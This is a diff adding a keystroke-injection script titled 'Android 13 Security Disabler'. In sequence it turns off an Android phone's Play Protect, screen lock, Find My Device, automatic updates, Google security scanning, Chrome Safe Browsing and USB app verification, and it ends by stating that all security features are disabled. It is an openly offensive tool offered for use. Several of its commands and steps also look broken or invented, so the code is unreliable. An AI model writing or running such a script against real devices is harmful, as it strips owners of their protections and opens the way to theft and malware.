@@ -1,0 +1,308 @@
+REM Android 13 Security Disabler
+REM Author: Cascade
+REM Version: 1.0
+REM Optimized for Android 13's security model
+
+REM ---- INITIAL SETUP ----
+DELAY 1500
+
+REM Wake up the device
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Swipe up to unlock (Android 13 method)
+SWIPE 500 1800 500 800
+DELAY 1500
+
+REM ---- STEP 1: DISABLE GOOGLE PLAY PROTECT ----
+
+REM Open Google Play Store
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING play store
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Access user profile
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Navigate to Play Protect
+STRING play protect
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Tap settings gear
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Disable "Scan apps" toggle
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm with "Turn off" button
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM ---- STEP 2: DISABLE BIOMETRICS AND SCREEN LOCK ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Security section
+STRING security
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Screen lock
+STRING screen lock
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enter current PIN/pattern if required (example with PIN 1234)
+STRING 1234
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select "None" as screen lock
+STRING none
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Confirm removing screen lock
+TAB
+DELAY 300
+TAB
+DELAY 300
+STRING remove
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 3: DISABLE FIND MY DEVICE ----
+
+REM Go back to Security
+BACK
+DELAY 800
+
+REM Find "Find My Device"
+STRING find my device
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Turn off Find My Device
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 4: DISABLE AUTOMATIC SYSTEM UPDATES ----
+
+REM Go to System settings
+BACK
+DELAY 800
+BACK
+DELAY 800
+STRING system
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to System update
+STRING update
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Tap on settings gear
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Disable automatic updates
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 5: DISABLE GOOGLE SECURITY SERVICES ----
+
+REM Go to Google settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+STRING google
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Navigate to Security
+STRING security
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Disable "Improve harmful app detection"
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Disable "Scan device for security threats"
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- STEP 6: DISABLE SAFE BROWSING IN CHROME ----
+
+REM Open Chrome
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING chrome
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Open Chrome menu
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1500
+
+REM Go to Settings
+STRING settings
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Navigate to Privacy and Security
+STRING privacy
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find Safe Browsing
+STRING safe browsing
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Select "No protection"
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+STRING no protection
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 7: DISABLE APP VERIFICATION ----
+
+REM Go to Developer options
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+STRING developer
+DELAY 800
+ENTER
+DELAY 1500
+
+REM If developer options not enabled, enable them
+REM Go to About phone
+STRING about
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Tap Build number 7 times
+REPEAT 7 {
+    STRING build
+    DELAY 300
+    ENTER
+    DELAY 300
+}
+DELAY 1000
+
+REM Go back to Settings and then Developer options
+BACK
+DELAY 800
+STRING developer
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Disable "Verify apps over USB"
+STRING verify
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM ---- FINISHED ----
+REM All security features have been disabled
